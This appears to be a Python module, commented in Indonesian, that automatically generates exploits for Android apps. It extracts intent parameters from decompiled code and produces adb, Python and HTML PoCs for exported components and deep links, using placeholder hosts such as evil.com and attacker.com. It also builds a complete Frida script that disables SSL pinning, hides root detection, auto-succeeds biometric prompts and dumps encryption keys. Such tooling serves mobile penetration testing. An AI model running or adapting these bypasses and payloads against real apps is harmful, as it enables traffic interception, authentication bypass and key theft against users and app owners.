import os
import re
import json
import urllib.parse
from pathlib import Path
from typing import Dict, Any, List, Optional

class PoCEngine:
    """
    Engine untuk men-generate PoC & Exploit Scripts otomatis:
    - Opsi A: Ekstraksi parameter Intent (getStringExtra, getIntExtra, dll) & DeepLink Query Params
    - Opsi B: Generator Frida Bypass Script (Root, SSL Pinning, Biometric, Crypto Dumper)
    - Opsi C: HTML Exploit Builder (WebView XSS, DeepLink Launcher, Intent URL)
    - Opsi D: Python Auto-Verifier + Logcat Assertion
    - Opsi E: Skeleton AI Assistant Connector
    """

    def __init__(self, corpus_dir: Optional[Path] = None):
        self.corpus_dir = corpus_dir

    def extract_intent_extras_from_file(self, file_path: Path) -> List[Dict[str, Any]]:
        """Mengekstrak ekstra intent (String, Int, Boolean, Uri query) dari file Java atau Smali."""
        if not file_path.exists() or not file_path.is_file():
            return []
        
        try:
            content = file_path.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            return []

        extras = []
        seen = set()

        # 1. String Extras: getStringExtra("key")
        for m in re.finditer(r'(?:getStringExtra|getString)\s*\(\s*["\']([^"\']+)["\']\s*\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "string",
                    "key": key,
                    "sample_value": "https://evil.com/xss_payload",
                    "adb_flag": f'--es "{key}" "https://evil.com/xss_payload"'
                })

        # 2. Boolean Extras: getBooleanExtra("key", ...)
        for m in re.finditer(r'getBooleanExtra\s*\(\s*["\']([^"\']+)["\']\s*,\s*[^)]+\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "boolean",
                    "key": key,
                    "sample_value": "true",
                    "adb_flag": f'--ez "{key}" true'
                })

        # 3. Integer / Long Extras: getIntExtra("key", ...) / getLongExtra("key", ...)
        for m in re.finditer(r'(?:getIntExtra|getLongExtra)\s*\(\s*["\']([^"\']+)["\']\s*,\s*[^)]+\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "int",
                    "key": key,
                    "sample_value": "1337",
                    "adb_flag": f'--ei "{key}" 1337'
                })

        # 4. URI Query Parameters: getQueryParameter("param")
        for m in re.finditer(r'getQueryParameter\s*\(\s*["\']([^"\']+)["\']\s*\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "query_param",
                    "key": key,
                    "sample_value": "https://attacker.com/callback",
                    "uri_part": f'{key}=https://attacker.com/callback'
                })

        # 5. Smali Patterns: const-string vX, "key" -> invoke-virtual {vY, vX}, Landroid/content/Intent;->getStringExtra
        for m in re.finditer(r'const-string\s+[vp]\d+,\s*["\']([^"\']+)["\']\s*\n\s*invoke-virtual\s*\{[^}]+\},\s*Landroid/content/Intent;->get(?:String|Boolean|Int)Extra', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "string",
                    "key": key,
                    "sample_value": "EXPLOIT_PARAM",
                    "adb_flag": f'--es "{key}" "EXPLOIT_PARAM"'
                })

        return extras

    def find_component_source_files(self, component_name: str) -> List[Path]:
        """Mencari file .java atau .smali yang sesuai dengan nama class komponen."""
        if not self.corpus_dir or not self.corpus_dir.exists():
            return []

        rel_path_part = component_name.replace(".", "/")
        simple_name = component_name.split(".")[-1]
        matches = []

        for p in self.corpus_dir.rglob("*.java"):
            if rel_path_part in str(p).replace("\\", "/") or simple_name in p.name:
                matches.append(p)

        if not matches:
            for p in self.corpus_dir.rglob("*.smali"):
                if rel_path_part in str(p).replace("\\", "/") or simple_name in p.name:
                    matches.append(p)

        return matches[:3]

    def generate_component_poc(self, package_name: str, component: Dict[str, Any]) -> Dict[str, Any]:
        """Menghasilkan PoC terinci untuk komponen yang diekspor dengan ekstraksi parameter asli."""
        comp_name = component.get("name", "")
        comp_type = (component.get("type") or "activity").lower()
        exported = component.get("exported") in (True, "true", "True")
        authority = component.get("authority", "")

        # Ekstraksi parameter asli dari kode jika corpus tersedia
        extracted_extras = []
        if comp_name:
            source_files = self.find_component_source_files(comp_name)
            for sf in source_files:
                extras = self.extract_intent_extras_from_file(sf)
                if extras:
                    extracted_extras.extend(extras)
                    break

        # Susun ADB flags dari extracted parameters
        extra_flags = " ".join([e["adb_flag"] for e in extracted_extras if "adb_flag" in e])
        if not extra_flags:
            # Fallback jika tidak terdeteksi extras khusus
            if comp_type == "activity":
                extra_flags = '--es "url" "https://evil.com" --ez "is_admin" true'
            else:
                extra_flags = '--es "data" "probe_payload"'

        full_target = f"{package_name}/{comp_name}" if not comp_name.startswith(package_name) else comp_name
        if "/" not in full_target:
            full_target = f"{package_name}/{comp_name}"

        # 1. Shell Script PoC
        if comp_type == "activity":
            adb_cmd = f'adb shell am start -n {full_target} {extra_flags}'.strip()
            desc = "Launch Unprotected Exported Activity with Extracted Intent Extras"
        elif comp_type == "service":
            adb_cmd = f'adb shell am startservice -n {full_target} {extra_flags}'.strip()
            desc = "Trigger Exported Background Service directly"
        elif comp_type == "receiver":
            adb_cmd = f'adb shell am broadcast -n {full_target} {extra_flags}'.strip()
            desc = "Send Spoofed Broadcast to Exported Receiver"
        elif comp_type == "provider":
            auth_val = authority or f"{package_name}.provider"
            adb_cmd = f'adb shell content query --uri content://{auth_val}/'
            desc = "Query Exported Content Provider directly"
        else:
            adb_cmd = f'adb shell am start -n {full_target} {extra_flags}'.strip()
            desc = "Direct Component Invocation"

        bash_script = f"""#!/bin/bash
# ==============================================================================
# Exploit PoC for Exported {comp_type.upper()}: {comp_name.split('.')[-1]}
# Target Package: {package_name}
# Description: {desc}
# ==============================================================================

echo "[*] Sending payload to target component..."
{adb_cmd}

echo "[+] Done. Check device screen or logcat."
"""

        # 2. Python Auto-Verifier PoC dengan Logcat Watcher (Opsi D)
        python_script = f"""#!/usr/bin/env python3
# ==============================================================================
# Automated Verification Script with Logcat Assertion
# Target: {package_name} ({comp_name})
# ==============================================================================
import subprocess
import time
import sys

PACKAGE = "{package_name}"
COMPONENT = "{full_target}"

print(f"[*] Starting logcat listener for {{PACKAGE}}...")
# Clear logcat first
subprocess.run(["adb", "logcat", "-c"], check=False)

print(f"[*] Executing exploit command...")
cmd = {json.dumps(adb_cmd.split())}
proc = subprocess.run(cmd, capture_output=True, text=True)
print(f"[>] Command output: {{proc.stdout.strip()}}")

time.sleep(1.5)

print(f"[*] Checking logcat for exceptions or successful trigger...")
log_proc = subprocess.run(["adb", "logcat", "-d", "-s", "AndroidRuntime:E", f"{{PACKAGE}}:V"], capture_output=True, text=True)
logs = log_proc.stdout

if "FATAL EXCEPTION" in logs or "Crash" in logs:
    print("[!] ALERT: Application crashed / NullPointer triggered via intent manipulation!")
elif proc.returncode == 0:
    print("[+] SUCCESS: Intent delivered successfully without permission denial.")
else:
    print(f"[-] Execution failed: {{proc.stderr}}")
"""

        return {
            "component_name": comp_name,
            "component_type": comp_type,
            "exported": exported,
            "extracted_extras": extracted_extras,
            "adb_command": adb_cmd,
            "bash_poc": bash_script,
            "python_poc": python_script
        }

    def generate_deeplink_poc(self, package_name: str, deeplink_str: str) -> Dict[str, Any]:
        """Menghasilkan PoC lengkap untuk skema Deep Link & WebView Launcher (Opsi C & D)."""
        scheme_url = deeplink_str.strip()
        if "://" not in scheme_url:
            scheme_url = f"{scheme_url}://open?url=https://attacker.com/xss"

        # Coba parse query string atau tambahkan parameter redirect uji coba
        parsed = urllib.parse.urlparse(scheme_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        test_url = scheme_url
        if not parsed.query:
            test_url = f"{scheme_url}?url=https://attacker.com/poc_redirect&target=https://attacker.com/evil"

        adb_cmd = f'adb shell am start -a android.intent.action.VIEW -d "{test_url}"'

        bash_script = f"""#!/bin/bash
# ==============================================================================
# Exploit PoC for DeepLink Intent Scheme: {deeplink_str}
# Target Package: {package_name}
# ==============================================================================

echo "[*] Triggering DeepLink intent onView..."
{adb_cmd}
"""

        # HTML Exploit Launcher (Opsi C)
        html_exploit = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DeepLink & WebView Hijacking PoC - {package_name}</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; padding: 40px; }}
        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 24px; max-width: 700px; margin: 0 auto; }}
        h1 {{ color: #38bdf8; font-size: 20px; }}
        a.button {{ display: inline-block; background: #3b82f6; color: white; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 16px; }}
        code {{ background: #0f172a; padding: 4px 8px; border-radius: 4px; color: #a3e635; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="card">
        <h1>🎯 DeepLink Redirection / XSS Exploit PoC</h1>
        <p>Target App: <code>{package_name}</code></p>
        <p>Target DeepLink URL Scheme:</p>
        <p><code>{test_url}</code></p>
        <hr style="border-color:#334155; margin: 20px 0;">
        <p>Klik tombol di bawah jika aplikasi tidak terbuka secara otomatis:</p>
        <a href="{test_url}" class="button">🚀 Trigger DeepLink Exploit</a>
    </div>

    <!-- Automatic Redirection Trigger -->
    <script>
        setTimeout(function() {{
            window.location.href = "{test_url}";
        }}, 800);
    </script>
</body>
</html>
"""

        # Python Assertion PoC
        python_poc = f"""#!/usr/bin/env python3
import subprocess
import time

DEEPLINK = "{test_url}"
print(f"[*] Triggering DeepLink: {{DEEPLINK}}")
subprocess.run(["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW", "-d", DEEPLINK])
"""

        return {
            "deeplink": deeplink_str,
            "test_url": test_url,
            "adb_command": adb_cmd,
            "bash_poc": bash_script,
            "html_poc": html_exploit,
            "python_poc": python_poc
        }

    def generate_frida_bypass_script(self, package_name: str, findings: List[Dict[str, Any]] = None, rasp_info: str = "") -> str:
        """
        Menghasilkan Comprehensive Frida Hook Script (Opsi B):
        1. Universal SSL Pinning Bypass (OkHttp3, TrustManagerImpl, NetworkSecurityConfig, Webview)
        2. Root & Anti-Tamper Bypass (su paths, test-keys, RootBeer)
        3. Biometric Authentication Bypass
        4. Targeted Crypto Dumper (AES/DES Key derivation hook)
        """
        findings = findings or []
        has_crypto = any('crypto' in (f.get('category') or '').lower() or 'key' in (f.get('rule_id') or '').lower() for f in findings)
        
        script = f"""/**
 * ==============================================================================
 * Comprehensive Frida Bypass & Security Hooking Suite
 * Target Package: {package_name}
 * Features:
 *   [1] Universal SSL Pinning Bypass (OkHttp3, TrustManagerImpl, WebView, Conscrypt)
 *   [2] Root / Jailbreak & Anti-VM Detection Bypass
 *   [3] Biometric Authentication Hook (Fingerprint / FaceID Auto-Pass)
 *   {"[4] AES/DES Secret Key & Cipher Dumper" if has_crypto else "[4] Dynamic Keystore & SharedPrefs Interceptor"}
 * ==============================================================================
 */

Java.perform(function () {{
    console.log("[*] [Frida] Injecting Universal Security Bypass Suite for {package_name}...");

    // ==========================================================================
    // 1. UNIVERSAL SSL PINNING BYPASS
    // ==========================================================================
    try {{
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        var TrustManager = Java.registerClass({{
            name: 'com.mobileaudit.TrustAllManager',
            implements: [X509TrustManager],
            methods: {{
                checkClientTrusted: function (chain, authType) {{}},
                checkServerTrusted: function (chain, authType) {{}},
                getAcceptedIssuers: function () {{ return []; }}
            }}
        }});

        var TrustManagers = [TrustManager.$new()];
        var SSLContext_init = SSLContext.init.overload(
            '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'Ljava.security.SecureRandom;'
        );
        SSLContext_init.implementation = function (keyManager, trustManager, secureRandom) {{
            console.log("[+] [SSL Bypass] Hooked SSLContext.init() -> Overriding with TrustAllManager");
            SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
        }};
        console.log("[+] [SSL Bypass] javax.net.ssl.SSLContext TrustManager bypass active.");
    }} catch (e) {{
        console.log("[-] [SSL Bypass] SSLContext hook failed: " + e);
    }}

    // OkHttp3 CertificatePinner Bypass
    try {{
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function (hostname, peerCertificates) {{
            console.log("[+] [SSL Bypass] OkHttp3 CertificatePinner.check() bypassed for: " + hostname);
            return;
        }};
        CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function (hostname, peerCertificates) {{
            console.log("[+] [SSL Bypass] OkHttp3 CertificatePinner.check(Array) bypassed for: " + hostname);
            return;
        }};
    }} catch (e) {{}}

    // WebView SSL Error Bypass
    try {{
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function (view, handler, error) {{
            console.log("[+] [SSL Bypass] WebViewClient.onReceivedSslError() -> Proceeding");
            handler.proceed();
        }};
    }} catch (e) {{}}


    // ==========================================================================
    // 2. ROOT & ANTI-TAMPER / ANTI-VM DETECTION BYPASS
    // ==========================================================================
    try {{
        var File = Java.use('java.io.File');
        File.exists.implementation = function () {{
            var path = this.getAbsolutePath();
            if (path.indexOf("/system/bin/su") > -1 || path.indexOf("/system/xbin/su") > -1 ||
                path.indexOf("/sbin/su") > -1 || path.indexOf("magisk") > -1 ||
                path.indexOf("/system/app/Superuser.apk") > -1) {{
                console.log("[+] [Root Bypass] Hiding root binary path: " + path);
                return false;
            }}
            return this.exists.call(this);
        }};

        var SystemProperties = Java.use('android.os.SystemProperties');
        SystemProperties.get.overload('java.lang.String').implementation = function (key) {{
            if (key === "ro.build.tags" || key === "ro.debuggable") {{
                return "release-keys";
            }}
            return this.get.call(this, key);
        }};
        console.log("[+] [Root Bypass] Root binary & build tags check bypassed.");
    }} catch (e) {{}}


    // ==========================================================================
    // 3. BIOMETRIC AUTHENTICATION AUTO-BYPASS
    // ==========================================================================
    try {{
        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
        BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function (promptInfo) {{
            console.log("[+] [Biometric Bypass] Hooked BiometricPrompt.authenticate() -> Auto triggering onSuccess");
            var callback = this.mAuthenticationCallback.value;
            if (callback) {{
                callback.onAuthenticationSucceeded(null);
            }}
            return;
        }};
    }} catch (e) {{}}


    // ==========================================================================
    // 4. CRYPTO KEYS & CIPHER INTERCEPTOR
    // ==========================================================================
    try {{
        var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
        SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function (keyBytes, algorithm) {{
            var hexKey = "";
            for (var i = 0; i < keyBytes.length; i++) {{
                var b = (keyBytes[i] & 0xFF).toString(16);
                if (b.length === 1) b = "0" + b;
                hexKey += b;
            }}
            console.log("[🔑 Crypto Dumper] SecretKeySpec (" + algorithm + "): Hex=" + hexKey);
            return this.$init(keyBytes, algorithm);
        }};

        var Cipher = Java.use('javax.crypto.Cipher');
        Cipher.doFinal.overload('[B').implementation = function (input) {{
            var res = this.doFinal(input);
            console.log("[🔒 Cipher.doFinal] Algorithm=" + this.getAlgorithm() + " | InputLen=" + input.length);
            return res;
        }};
    }} catch (e) {{}}

    console.log("[✓] [Frida] All hooks initialized successfully!");
}});
"""
        return script
